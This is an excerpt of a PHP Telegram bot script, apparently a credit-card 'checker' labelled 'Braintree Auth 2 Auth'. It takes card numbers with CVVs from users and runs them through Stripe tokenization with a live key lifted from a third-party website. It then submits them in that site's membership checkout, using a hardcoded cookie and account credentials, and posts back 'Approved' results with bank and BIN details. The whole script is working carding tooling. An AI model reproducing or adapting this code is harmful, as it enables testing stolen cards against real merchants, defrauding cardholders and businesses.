...
//====ANTISPAM AND WRONG FORMAT====//
    if (strlen($message) <= 4) {
            sendMessage($chatId, '<b>♤•Wrong Format! ⚠️</b>%0A♤•USAGE: <code>/sex cc|mm|yy|cvv</code>%0A♤GATE-WAY: Braintree Auth 2 Auth%0A♤CREATED: [2024-03-23]', $message_id);
            exit();
  }
...
$headers[] = 'sec-ch-ua: "Brave";v="123", "Not:A-Brand";v="8", "Chromium";v="123"';
...
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F72cbeb54c5%3B+stripe-js-v3%2F72cbeb54c5%3B+split-card-element&referrer=https%3A%2F%2Fwww.yasminmogahedtv.com&time_on_page=194385&key=pk_live_51HdbmyHNc8MTJAaGytBzUdQLnsyVtugsmpGoxyN6NwE9ip5CsvYgmwAgxB5JBcyGnORmoxbtZzdvMl4AN6TwejOX00t0lGfzmO');
...
$headers = array(
  ...
  'cookie: PHPSESSID=bbsh6emv49c8rpgkfsbanf2lu4; pmpro_visit=1',
...
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=4&checkjavascript=1&other_discount_code=&username=javascriptbasic&password=Iamgeniuss%40900&password2=Iamgeniuss%40900&bemail=javascriptbasic12code%40gmail.com&bconfirmemail=javascriptbasic12code%40gmail.com&fullname=&telephone=8317568311&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX6240&ExpirationMonth=07&ExpirationYear=2024');
...
━━━━━━━━━━━━━━━━━━
[×] 𝗖𝗖 ➔ <code>$lista</code>
[×] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➔ Braintree Approved 🟢
[×] 𝗕𝗶𝗻 𝗜𝗻𝗳𝗼 ➔ $bank
[×] 𝗕𝗮𝗻𝗸 ➔ $brand
[×] 𝗧𝘆𝗽𝗲 ➔ $type
[×] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➔ $name $emoji
[×] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ➔ $time seconds 
[×] 𝗥𝗲𝗾 𝗕𝘆 ➔ @$username [$rank]
";
sleep(1);
